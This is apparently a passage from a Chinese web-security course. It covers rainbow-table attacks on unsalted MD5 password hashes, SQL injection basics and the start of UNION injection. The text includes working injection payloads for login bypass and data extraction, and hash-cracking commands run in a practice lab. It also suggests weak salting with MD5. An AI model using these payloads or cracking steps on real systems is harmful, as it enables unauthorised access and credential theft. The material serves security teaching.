<p>通过上述示例可以发现，存在设计缺陷的R函数会导致大量碰撞的发生，而一旦中间某节点发生碰撞，就会导致后续节点全部碰撞，这样会大大缩小预计算HASH链集能够覆盖的攻击范围。又因为预计算HASH链只保存收尾节点，因此想要发现两条链的高度相似性是非常难的。</p>

<p><strong>彩虹表的出现正是为了解决R函数引起的链碰撞问题。</strong></p>

<p>彩虹表的设计理念是，在生成预计算的HASH链时采用多种R函数，也就是在每个轮次的计算中分别使用R1、R2、R3函数等，大致含义如下：</p>

<p><img src="assets/e384f6cd67c947ac932e7985799ff9af.jpg" alt="图片"></p>

<p>这样即使发生了之前我们所描述的碰撞情况，通常会是以下这种情况：</p>

<p><img src="assets/90b9f1e7a14d4634b2e6e03cb71bbb39.jpg" alt="图片"></p>

<p>可以看到，虽然部分节点发生了碰撞，但是由于发生碰撞的位置并非在同一序列，使用的R函数也不是同一个，因此后续产生的节点也不相同。</p>

<p>这样，即使同一序列位置发生碰撞，导致后续节点完全相同，但是因为末节点是相同的，所以我们仍然可以非常快速地找出这条相似链，删除它来优化存储空间。</p>

<p>而关于彩虹表的使用方法，本质上与HASH链集并无二致，核心思想仍然是计算得出R函数的结果并与HASH链进行匹配。它们的区别在于，<strong>计算出的序列结果是否唯一</strong>。因为HASH链集使用的是相同的R函数，所以，如果我们对待破解的HASH散列进行R函数计算，所产生的序列结果是唯一的；但是彩虹表使用的是不同的R函数，因此计算时需要将待破解的HASH散列带入不同位置，从而得出多个序列结果。</p>

<h2 id="案例实战">案例实战</h2>

<p>了解了彩虹表的原理和用法，接下来，我们就进入一个真实场景中实战一下。</p>

<p>打开<a href="https://mituan.zone/#/" target="_blank">MiTuan</a>并选择【极客时间-漏洞挖掘与智能攻防实战】靶场，进入后选择【忘记加“盐”：加密结果强度不够吗？】靶机环境。</p>

<p>可以看到，这是一个很简单的登录界面。</p>

<p><img src="assets/8114d980c9d1425ab8ff982bff2b1ffe.jpg" alt="图片"></p>

<p>接下来，我们使用简单的注入来获取用户密码信息：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">User</span> <span class="hljs-operator">=</span> <span class="hljs-string">' union select username,password from users; 
Password = 1
</span></code></pre>

<p>如果你不理解这个注入过程，不要担心，下一节课我们就会深入探讨SQL注入漏洞。-
通过简单的注入操作，我们可以获得用户名以及密码信息如下：</p>

<p><img src="assets/8c3c8a87c643474ead1767571f2ff92e.jpg" alt="图片"></p>

<pre><code class="language-plain">Dumb
2b161cb042f799e5f43ae6efc9e57926
</code></pre>

<p>接下来我们就尝试使用彩虹表攻击来破解这个HASH散列值。</p>

<p>首先解压我们提供的压缩包，进入rainbow目录后运行如下命令：</p>

<pre><code class="language-bash hljs">docker build -t rainbow:v0 . <span class="hljs-comment"># 构建镜像</span>
docker run -it rainbow:v0 <span class="hljs-comment"># 启动容器并获得交互式shell</span>

<span class="hljs-comment"># 生成 md5哈希函数的 1-9a-zA-Z 最短1位 最长5位 10种不同R函数组合 每条链5000长度 10000条链 0偏移 的彩虹表</span>
./rtgen md5 mixalpha-numeric 1 5 10 10000 60000 0

<span class="hljs-comment"># 生成彩虹表之后排序，方便结果查找</span>
./rtsort .

<span class="hljs-comment"># 执行彩虹表破解，极小概率失败，主要是由于彩虹表具有不确定性，因此不能确保成功</span>
./rcrack . -h 2b161cb042f799e5f43ae6efc9e57926
</code></pre>

<p>在我的电脑上大约不到1秒就完成破解了，密码明文是<code>t1sec</code>，破解结果如下：</p>

<pre><code class="language-bash hljs">1 rainbow tables found
memory available: 1033964748 bytes
memory <span class="hljs-keyword">for</span> rainbow chain traverse: 160000 bytes per <span class="hljs-built_in">hash</span>, 160000 bytes <span class="hljs-keyword">for</span> 1 hashes
memory <span class="hljs-keyword">for</span> rainbow table buffer: 2 x 960016 bytes
disk: ./md5_mixalpha-numeric<span class="hljs-comment">#1-5_10_10000x60000_0.rt: 960000 bytes read</span>
disk: finished reading all files
plaintext of 2b161cb042f799e5f43ae6efc9e57926 is t1sec

statistics
----------------------------------------------------------------
plaintext found:                             1 of 1
total time:                                  0.90 s
time of chain traverse:                      0.90 s
time of alarm check:                         0.00 s
time of disk <span class="hljs-built_in">read</span>:                           0.00 s
<span class="hljs-built_in">hash</span> &amp; reduce calculation of chain traverse: 49990000
<span class="hljs-built_in">hash</span> &amp; reduce calculation of alarm check:    49990
number of alarm:                             257
performance of chain traverse:               55.54 million/s
performance of alarm check:                  16.66 million/s

result
----------------------------------------------------------------
2b161cb042f799e5f43ae6efc9e57926  t1sec  hex:7431736563
</code></pre>

<p>可以看到彩虹表的查询速度是非常快的，每秒可以执行约5500万条链的查询，实际上本次爆破仅使用了0.9s就已经攻击完成。</p>

<h2 id="安全实践">安全实践</h2>

<p>好，学习了这么多，那么如何存储密码才是安全的呢？</p>

<p>安全级别从低到高，来看看我们都有哪些选择。</p>

<p>首先，最简单也是安全级别最低的方案，是<strong>直接存储明文密码secret</strong>，这种方式一旦系统遭遇攻击，会导致所有账户密码泄露，因此毫无安全性可言，在实际应用中已经被抛弃了。</p>

<p>接下来，目前一种常见的密码存储方案，就<strong>是将明文密码带入一个HASH函数，并将散列值HASH(secret)作为结果存储到数据库</strong>，使用这种方案，系统即使受到了入侵，攻击者获得的也只是HASH散列值。但是由于彩虹表的存在，密码依然很容易被破解。</p>

<p>更进一步地，我们可以<strong>将明文密码加盐</strong>，对加盐结果进行Hush运算HASH(secret+salt)，然后将运算的散列值结果存储到数据库中。在保证每个用户的salt不一样的情况下，这种方案的安全性是可接受的，为了保证这一点，我们可以选择用户名、手机号等信息作为salt。</p>

<p>最后我们来看看，如何从<strong>最佳安全实践</strong>的角度处理数据。</p>

<p>一般来说，加盐会通过在原始字段的特定位置增加特定的字符，使其与原始输入不一致，比如用户使用了一个密码：</p>

<pre><code class="language-plain">talentsec
</code></pre>

<p>经过MD5处理后，可以得出结果：</p>

<pre><code class="language-plain">MD5 ("talentsec") = 0fd2671a7c179391e3e3ebb6ec70fa8f
</code></pre>

<p>很明显，该密码长度仅有9位，且完全使用小写英文字母。这样的密码取值空间很小，因此是很容易被彩虹表攻击的。因此，我们选择在用户的密码后添加特定的字符串，来增加它的安全性，比如新增用户的用户名：</p>

<pre><code class="language-plain">MD5 ("talentsecwwwhhhttt") = 91a9740ca090824cb00c4be0a319fb89
</code></pre>

<p>可以看到加盐之后密码位数变长了，同时散列结果也发生了变化。-
考虑到数据长度大幅增加，攻击者直接使用彩虹表攻击难度非常高。如果想要成功攻击散列值，攻击者则需要了解加盐的逻辑，并且以此逻辑重新生成彩虹表。即便如此，因为每个用户的加盐都是不一样的，攻击复杂度也只能针对单一密码降低，攻击者仍然无法使用彩虹表实现批量攻击，从结果上看，这将大大提高密码存储的安全性。</p>

<h2 id="总结">总结</h2>

<p>回顾一下，这节课我们认识了一种系统开发中的调味品——“盐“。</p>

<p>首先，我们对“盐“是什么有了一个形象的认知，与做菜相似，<strong>系统中通过使用“盐“（salt）来混淆输入</strong>。而关于盐的使用，又不得不提HASH函数。作为一种特殊的密码学算法，<strong>HASH函数具备计算不可逆、数据长度压缩、难以伪造等特性</strong>，这些优秀的特性给它带来了非常多的应用场景，比如数据传递过程中的完整性校验、数据压缩与摘要、数据纠错与散列表等等。</p>

<p>正如人们由于烧菜时味道不够而生产了盐，在系统开发中，由于过去存储密码的方案安全性不足，因此引入了”盐“的概念。过去在系统中，普遍采用经过HASH函数运算的散列值来存储用户密码，这一过程面临的攻击主要包括暴力破解、字典攻击，但是这两种攻击方式因为在时间和空间上的损耗过高，所以难以真正实施。</p>

<p>彩虹表的出现打破了平静，它推翻了直接将用户密码运算出HASH散列值的方案，通过特殊设计的算法实现了时空平衡，这让攻击HASH散列值成为可能。</p>

<p>于是我们进一步分析了这种设计巧妙的攻击算法，验证了它对传统密码存储方案的威胁。而且我们不甘心于纸上谈兵，通过一个实战案例成功完成了一次彩虹表攻击。掌握了这种攻击方法，你就可以将它集成到自己的个性化智能攻击系统中。</p>

<p>最后，我们再次站在安全开发的角度，从目前普遍接受的安全实践出发，复现了最佳实践方案。</p>

<p>通过这节课的学习，相信你不仅掌握了HASH函数、盐、散列函数应用和安全最佳实践，还丰富了自己的智能攻击系统，使其功能更加强大。有了这些知识和装备的加持，相信你可以在安全领域进一步探索前行，发现更多二进制世界的秘密！</p>

<h2 id="思考">思考</h2>

<p>在使用HASH链进行HASH散列值破解的过程中，如果原始输入与HASH链的头或者尾产生碰撞，为什么是很大可能性而不是一定在该链条中存在HASH散列值的破解结果呢？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>

<p>相关工具：-
<a href="https://github.com/talentsec/rainbow" target="_blank">https://github.com/talentsec/rainbow</a></p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="12 注入（上）：SQL注入起手式" class="title">12 注入（上）：SQL注入起手式</h1>
                            <div><p>你好，我是王昊天。</p>

<p>从这节课开始，我们就进入了排名第三的风险种类——注入。</p>

<p>这是在上一份OWASP TOP 10榜单中排名第一的风险种类，同时也是在过去十年中最具威慑力的漏洞类型之一，关于这类安全风险出现了许多重大的漏洞，同时也有众多著名的安全工具致力于解决这类问题，其中最著名的安全工具之一就是sqlmap，作为SQL注入领域优秀的自动化检测工具，我们也会在之后的课程中深入探究。</p>

<p>那么什么是注入呢？</p>

<p>在著名的西游世界，就有许多次战斗生动地诠释了注入的威力，而这位善用注入的战斗大师就是我们勇敢机智的齐天大圣——孙悟空。在《西游记》中，孙悟空一共六次通过钻入敌人肚子的方式取得战斗的胜利。</p>

<h2 id="注入">注入</h2>

<p>孙悟空的行为堪称注入攻击的典范，那么安全领域的注入攻击又是什么呢？</p>

<p>从抽象定义来说，注入攻击的本质是<strong>数据段与指令段的混淆</strong>，攻击者在原本应该作为数据段的输入中插入了恶意指令，同时将该恶意指令作为代码执行。正如孙悟空的战斗一般，妖怪肚子原本是消化食物用的，但却让孙悟空潜入其中，并且大显神威。</p>

<p>事实上，注入包含很多种类型，比如SQL注入、命令注入、XSS、资源注入等，其中SQL注入是最具代表性也是极为危险的一类漏洞，这一讲我们就从SQL注入入手来展开探讨。</p>

<h4 id="查询过程与sql注入">查询过程与SQL注入</h4>

<p><img src="assets/090a04ab41ab466894317d1e74daf77f.jpg" alt="图片"></p>

<p>提到注入，就不得不提到<strong>查询过程</strong>。</p>

<p>以最常见的SQL注入为例，这类安全风险，就是将不可信的用户输入与SQL查询语句拼接产生的。事实上，SQL注入是Web安全领域最危险的漏洞种类之一，一方面SQL注入漏洞的利用过程比较简单，另一方面SQL注入漏洞可能导致数据库失窃、数据被篡改及清除等安全风险。在更严重的情况下，SQL注入可以通过应用程序传递恶意命令，控制托管数据库的操作系统，并以此为跳点成功进入内网。</p>

<h4 id="sql注入的危害">SQL注入的危害</h4>

<p>接下来我们来看一看SQL注入会产生哪些危害。</p>

<p>首先，<strong>SQL注入可能会导致数据的泄露</strong>。我们以一个电商系统为例，看看这个过程是怎么发生的。</p>

<p>在一个电商系统中，我们都会有一个个人信息页面用于编辑、展示和存储我们的相关信息，通常的URL地址如下：</p>

<pre><code class="language-plain">https://example.com/user_info?username=talentsec
</code></pre>

<p>在这种场景下，我们可以选择使用这种SQL语句来实现相应功能：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span>;
</code></pre>

<p>这里我们可以展开做一下思考，如果SQL语句变为如下格式，是否随着id的数值变化可以取得不同的数据呢？很明显是可以的。</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span>;
</code></pre>

<p>我们只需要尝试去修改username参数，将其设置为<code>talentsec' or id = '1</code>即可实现上述攻击过程。-
进一步地设想一种更复杂的场景，在这种场景下SQL语句不只有一个条件，除了用户名，还增加了账户活跃这一条件。</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span> <span class="hljs-keyword">and</span> account_status <span class="hljs-operator">=</span> <span class="hljs-string">'alive'</span>;
</code></pre>

<p>因为SQL语句变得更加复杂了，如果我们还用之前的方式攻击，就会破坏语句完整性，导致攻击无法顺利进行：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> account_status <span class="hljs-operator">=</span> <span class="hljs-string">'alive'</span>;
</code></pre>

<p>为了保证SQL语句的完整性，我们可以通过增加<code>--</code>注释符，让SQL语句重新恢复为合法格式，保证攻击能够顺利执行。调整后，username参数被设置为<code>talentsec' or id = '1' ; -- and account_status = 'alive</code>。 最终目的语句构造如下：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span> <span class="hljs-keyword">or</span> id <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span> ; <span class="hljs-comment">-- and account_status = 'alive';</span>
</code></pre>

<p>可以发现，由于SQL注入漏洞的存在，攻击者可以通过调整参数内容，获取到本不应该访问到的数据，这就会造成业务系统关键数据的泄露。</p>

<p>除了会造成数据泄露外，<strong>SQL注入漏洞还</strong><strong>可</strong><strong>能修改程序的执行逻辑</strong>。</p>

<p>这个过程我们将在登录场景下复现。正常的Web应用系统都会具备登录功能，通过将用户输入的用户名及密码传入后端，程序可以在后端匹配账户信息来验证正确性，其中一种SQL语句实现方式如下：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span> <span class="hljs-keyword">and</span> password <span class="hljs-operator">=</span> <span class="hljs-string">'TALENTSEC'</span>;
</code></pre>

<p>如果该查询能够返回结果，则说明登录成功，否则说明登录失败。一名恶意的攻击者，可以构造如下SQL语句使其绕过登录限制，也就是说，攻击者可以在仅知道用户名的情况下，成功完成登录：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'talentsec'</span>;<span class="hljs-comment">--' and password = 'test';</span>
</code></pre>

<p>可以看到，在这次攻击中攻击者所使用的用户名是<code>talentsec';--</code>，密码是<code>test</code>。虽然真实密码并不是<code>test</code>，但攻击者却成功登录了<code>talentsec</code>账户。</p>

<p>SQL注入的危害是巨大的，其攻击过程也较为复杂，接下来我们就来进一步探讨如何发现以及实施SQL注入攻击。</p>

<h2 id="sql注入实战技法">SQL注入实战技法</h2>

<h4 id="漏洞发现">漏洞发现</h4>

<p>知道吗，对于SQL注入漏洞来说，最难的一点其实是发现漏洞，而非利用漏洞。因为正如我们前面讨论的，SQL注入漏洞的利用过程相对简单，只要能够发现漏洞，利用不是问题。</p>

<p>为了更准确地发现SQL注入漏洞，我们需要了解，<strong>应用程序在什么时候会与数据库通信</strong>。这里，我给你提供两点参考。</p>

<p>你首先需要关注的是，通过表单提交认证的过程。这一过程会将用户输入的凭据发送到应用程序后端，并与数据库中存储的凭据进行比对。另外，一些管理后台和CMS系统，通过用户传入的参数针对性查询数据的时候，也需要我们特别关注。</p>

<p>一名优秀的攻击者需要对应用系统的接口参数有全面的了解，这些参数包括POST请求中隐藏的字段，也包括HTTP Header和Cookie。接下来，攻击者需要对每个参数进行针对性的攻击尝试，并观测系统结果。通常，最初的攻击尝试由<code>'</code>和<code>;</code>组成，这两个字符分别用于闭合字符串以及SQL查询语句。如果存在SQL注入漏洞，这两个字符的输入很有可能会触发系统报错。除此以外，一些注释符（<code>--</code>和<code>/**/</code>等）以及SQL关键字（<code>AND</code>和<code>OR</code>等）同样也可以被用来检测SQL注入漏洞点。</p>

<p>值得一提的是，虽然我们常常通过观测系统报错的方法来判断SQL注入漏洞点，但是并非所有SQL注入漏洞都会触发显性的系统报错。许多时候我们也会遇见<code>500 Server Error</code>或者系统的自定义报错界面，这时我们就需要考虑使用盲注或是其他攻击方式。</p>

<p>SQL注入漏洞作为一个漏洞大类，利用方式是比较多的，这使得它看起来有些复杂。但是，这类漏洞的利用过程见得多了，就会发现它们其实有相似的套路，借用《卖油翁》中的话说就是“无他，唯手熟尔”。</p>

<p>我们仍以经典的SQL查询语句为例：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">'$username'</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">'$password'</span>;
</code></pre>

<p>我们对username和password构造一种特殊的输入：</p>

<pre><code class="language-plain">$username = 1' or '1' = '1
$password = 1' or '1' = '1
</code></pre>

<p>代入参数后，SQL查询语句变成：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span>;
</code></pre>

<p>可以发现，在上述SQL语句中，不管<code>or</code>和<code>AND</code>操作符谁的优先级高，<code>WHERE</code>语句的条件都是永远为真的，因此我们可以通过这个操作，实现认证过程的绕过。</p>

<p>接下来，我们对原始SQL语句进行一次升级，这种升级后的语句也是非常常见的：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> ((username<span class="hljs-operator">=</span><span class="hljs-string">'$username'</span>) <span class="hljs-keyword">AND</span> (password<span class="hljs-operator">=</span>MD5(<span class="hljs-string">'$password'</span>)));
</code></pre>

<p>可以看到，这次升级一方面在username部分新增了括号，另一方面在处理password时，选择了MD5散列结果进行比较，最后又统计了查询结果的数量，经过升级之后，上一次的构造就无法生效了。</p>

<p>这时，如果我们想要构造新的参数完成SQL注入，就要解决三个问题，<strong>第一是括号的闭合，第二是password部分的比对，第三是要确保查询数量为1。</strong>于是我们构造如下输入：</p>

<pre><code class="language-plain">$username = 1' or '1' = '1')) LIMIT 1 --
$password = test
</code></pre>

<p>将参数代入后查询语句变成：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> ((username<span class="hljs-operator">=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'1'</span>)) LIMIT <span class="hljs-number">1</span> <span class="hljs-comment">--') AND (password=MD5('$password')));</span>
</code></pre>

<p>可以发现上述SQL语句实现了括号的闭合、忽略了password判断部分，并且限制结果数量为1，这段语句同时满足了3个限制条件，成功实现了SQL注入攻击。</p>

<p>在基本起手式阶段，除了这种使用<code>'</code>来进行注入探测的方式以外，我们还可以使用<code>AND</code>符号来判断参数是否可以被当做运算符参与代码执行。以常见的CMS类型系统为例，常见的帖子链接如下：</p>

<pre><code class="language-plain">https://example.com/article.php?id=1
</code></pre>

<p>在已知【id=1帖子】存在的情况下，我们可以将id参数设置为<code>1 AND 1=0</code>，并且和SQL语句完成拼接：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> articles <span class="hljs-keyword">WHERE</span> article_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>;
</code></pre>

<p>如果该页面无法显示内容，就说明<code>1 AND 1=0</code>中后半部分的False结果参与了运算，依此可以判断SQL注入漏洞的存在。</p>

<h4 id="数据库信息">数据库信息</h4>

<p>通过起手式阶段的基本动作，我们可以发现SQL注入漏洞是否存在。</p>

<p>在成功发现SQL注入漏洞之后，为了给后续更高级的注入动作做好铺垫，我们需要进入一个新的阶段–获取数据库信息。而之所以展开讲述这部分的主要原因是，虽然SQL语句是相对标准化的，但是每种DBMS在特殊指令、获取数据操作等方面都会有一些差异，因此在实际SQL注入过程中我们需要考虑到数据库差异使用不同的语法。</p>

<p>如果我们想要判断一个后端数据库的类型，让这个数据库报错是一个快速的方法。这里我们列举几种常见的错误信息，可以发现MySQL、MS SQL Server、PostgreSQL的报错信息都有比较明显的特征：</p>

<pre><code class="language-sql hljs">You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual
that corresponds <span class="hljs-keyword">to</span> your MySQL server version ...
Microsoft <span class="hljs-keyword">SQL</span> Native Client error ...
Query failed: ERROR: syntax error <span class="hljs-keyword">at</span> <span class="hljs-keyword">or</span> near ...
</code></pre>

<p>事实上，对于不同类型的数据库，获取其数据库种类和版本号的SQL语句也会有一些差异：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>; <span class="hljs-comment">-- Microsoft, MySQL</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> v$version; <span class="hljs-comment">-- Oracle</span>
<span class="hljs-keyword">SELECT</span> version(); <span class="hljs-comment">-- PostgreSQL</span>
</code></pre>

<p><img src="assets/b1e55107fd4542beb5b1968f3a04f40a.jpg" alt="图片"></p>

<p>除了数据库类型和版本信息，还有哪些信息是攻击者想知道的呢？我们只要想想后面注入过程需要哪些信息，答案就不辩自明了，其实，就是数据库中包含的表，和每张表的结构信息。令人欣慰的是，数据库中有一张表存储了这些信息，这张表是information_schema。通过如下SQL语句可以查询出数据库中有哪些表以及每张表的结构：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.tables;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">'users'</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> all_tables; <span class="hljs-comment">-- For Oracle</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> all_tab_columns <span class="hljs-keyword">WHERE</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">'USERS'</span>; <span class="hljs-comment">-- For Oracle</span>
</code></pre>

<h2 id="总结">总结</h2>

<p>这节课我们进入了第三大风险种类——注入。</p>

<p>作为上一份榜单中排名第一的安全风险，其威力不可小觑。在Web业务系统中，注入普遍以SQL注入形式存在，而SQL注入又与查询过程密不可分。通过利用SQL注入漏洞，不仅可以造成数据泄露、数据删除等后果，甚至可能使数据库服务器执行任意命令，进而导致整个内网的沦陷。</p>

<p>从技术角度来看，SQL注入的影响主要是两个方面，一方面是<strong>影响数据查询逻辑</strong>，使得攻击者能够越权访问数据库数据，另一方面是通过篡改数据查询逻辑进而<strong>修改SQL语句执行过程</strong>。</p>

<p>事实上，SQL注入漏洞虽然威力巨大，而且利用过程相对复杂，但是难度并不高。其难点主要在于<strong>如何发现SQL注入点，以及如何找到正确的利用方式</strong>。</p>

<p>关于如何发现SQL注入点，我向你介绍了一种有效的方法，那就是，在了解应用系统的完整接口以及接收的参数清单后，<strong>有针对性地逐一进行注入点排查</strong>。比较经典的注入点验证方案有<code>'</code>和<code>;</code>，以及<code>AND</code>和<code>OR</code>等 。</p>

<p>在确定正确的利用方式上，SQL注入虽然招式繁多，但是却有着完整的体系和套路，熟练掌握之后完全可以“一招鲜吃遍天”。<strong>起手式阶段最主要的组合拳就是</strong><code>AND</code><strong>和</strong><code>OR</code><strong>、</strong><code>'</code><strong>和</strong><code>--</code> ，第一招打完之后，为了给高级招式做铺垫，我们要学习下一招–知己知彼，<strong>通过利用information_schema获取数据库中包含的表以及对应的表结构</strong>。</p>

<p>截止到目前，你已经掌握了初级SQL注入功力，能够在简单的场景下完成SQL注入攻击同时掌握数据库的结构。下节课我们一起来学习高级招式，包括UNION注入、BOOLEAN注入、时间盲注、DNS带外注入等多种攻击变种。</p>

<h2 id="思考">思考</h2>

<p>你可以尝试使用MiTuan 靶场中的Sqlilabs完成基本的起手式和知己知彼这两招吗？</p>

<p>期待你的动手实践，也欢迎你把这节课分享给有需要的朋友，我们下节课再见！</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="13 注入（下）：SQL注入技战法及相关安全实践" class="title">13 注入（下）：SQL注入技战法及相关安全实践</h1>
                            <div><p>你好，我是王昊天。</p>

<p>上节课我们学习了SQL注入的基本原理和基础动作，但想要完成SQL注入攻击，仅凭借基础知识是不够的。这节课我们就来深入分析不同场景下的SQL注入，来了解这些场景下都有哪些攻击方式。</p>

<p>事实上，即使同为SQL注入漏洞，由于攻击过程中可利用的条件和限制不同，所能够采取的攻击方式也是有差异的。比如在篮球比赛中，同样是上篮，由于防守队员的不同，甚至是防守人数的不同，都会有不同的动作。</p>

<h2 id="注入技巧">注入技巧</h2>

<p><img src="assets/ec6987ecda424806b57e6fe84486736d.jpg" alt=""></p>

<h3 id="联合注入-union注入">联合注入（UNION注入）</h3>

<p>当SELECT语句中存在可以使用的SQL注入漏洞时，就可以用联合注入方法进行SQL注入，将两个查询合并为一个结果或结果集。</p>

<p>联合注入是在SQL注入中加入一个新的查询，在完成原始数据查询后，再进行一次查询，并将新的结果加入到原始查询的结果中，攻击者可以通过这种方式来获得目标数据。比如如下查询语句：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> Name, Phone, Address <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span>$id
# http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.example.com<span class="hljs-operator">/</span>product.php?id<span class="hljs-operator">=</span><span class="hljs-number">10</span>
</code></pre>

<p>这是一个简单的查询语句，目标是从<code>Users</code>表中查询指定<code>id</code>值的用户的姓名、密码以及地址信息。</p>

<p>这里我们可以对<code>id</code>的值进行设置，如果将<code>id</code>的值设为：</p>

<pre><code class="language-sql hljs"><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> creditCardNumber,<span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> CreditCardTable
</code></pre>

<p>那么整条查询语句将会变为：</p>

<pre><code class="language-sql hljs"><span class="hljs-keyword">SELECT</span> Name, Phone, Address <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> Id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> creditCardNumber,<span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> CreditCardTable
</code></pre>

<p>可以看到，我们已经构造出了一个联合查询语句，这里有两点需要我们特别关注。<strong>首先需要特殊说明的是，语句中</strong><code>ALL</code><strong>的作用。</strong>它防止我们添加的联合查询结果和原本的结果一致，导致其被过滤掉无法显示。添加<code>ALL</code>之后，即使联合查询的结果与原本的查询一致，也会返回两条一致的查询结果，从而方便我们判断攻击效果。</p>

<p>在联合查询中，<strong>另一个需要特殊说明的，是占位数据</strong>。可以看到，我们除了选择查询<code>creditCardNumber</code>，还添加了两个常数<code>1</code>。这是因为，原本查询的输出就包含三个字段，它们是“Name”、“Data”以及“Age”，其中“Data”以及“Age”都是常数类型的字段。在使用联合查询中，我们需要保证前后查询的字段数量、数据类型对应一致，上述查询过程中的<code>1</code>就是为了满足该需求。</p>

<p>可以发现，为了使用联合注入，我们需要提前知道<strong>原本查询的字段数量</strong>以及<strong>值的类型。</strong></p>

<p><strong>对于字段数量信息，我们可以利用<code>ORDER BY</code>来进行判断</strong>，例如：</p>

